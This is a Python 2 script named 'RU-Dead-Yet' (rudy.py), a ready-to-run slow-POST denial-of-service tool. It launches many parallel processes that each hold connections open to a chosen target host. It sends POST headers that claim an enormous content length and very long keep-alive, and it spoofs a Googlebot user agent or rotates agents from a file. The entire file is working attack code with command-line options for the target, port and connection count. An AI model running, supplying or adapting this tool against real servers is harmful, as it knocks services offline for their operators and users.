#-*- coding:utf-8 -*-
import socket,multiprocessing,sys,random,argparse
def usage():
    print "Usage:\nrudy.py <TARGET> <PORT> <CONNECTIONS> <USER-AGENT>\nOptional: <USER-AGENT> Text file with user agents\nError: Missing arguments"
    sys.exit(0)

def set_header(targett,user_agent):
    if user_agent is not None:
        agents = []
        with open(user_agent, 'rb') as ra:
            agents += ra.read().split('\n')
            ra.close()

        header = "POST index.php HTTP/1.1\r\nContent-Length: 100000000\r\nHost: {}\r\nKeep-Alive: 99999999\r\nConnection: keep-alive\r\nUser-Agent: {}".format(targett,random.choice(agents))
        print header
        return header
    else:
        header = "POST index.php HTTP/1.1\r\nContent-Length: 100000000\r\nHost: {}\r\nKeep-Alive: 99999999\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\r\n".format(targett)
        return header

def attack(targett,port,header):
    while True:
            sock = socket.socket()
            try:
                sock.connect((targett, port))
                if sock:
                    print 'connected\n'
                    sock.send(header)
                    print 'header sended\n'
                    sock.recv(1024)
                    sock.recv(1024)
                else:
                    raise Exception
            except:
                print 'Host recusou as conexoes\n'

def arguments():
    global args
    parser = argparse.ArgumentParser(description="RU-Dead-Yet")
    parser.add_argument('-t', '--target', help="IP or Domain of Target", type=str)
    parser.add_argument('-p', '--port', help="Port of Target", default=80, type=int)
    parser.add_argument('-c', '--connections', help="Number of connections", default=200, type=int)
    parser.add_argument('-u', '--useragent', help="Path to text file with User Agents", default=None, type=str)
    args = parser.parse_args()
    if args.target == None:
        sys.exit(parser.print_help())

if __name__ == '__main__':
    conections = []
    arguments()
    try:
        for i in range(args.connections):
            attack_process = multiprocessing.Process(target=attack, args=(args.target,args.port,set_header(args.target,args.useragent)))
            attack_process.start()
            conections.append(attack_process)
        for c in conections:
            c.join()
    except KeyboardInterrupt:
        for c in conections:
            c.terminate()
        for c in conections:
            c.join()
        sys.exit(0)
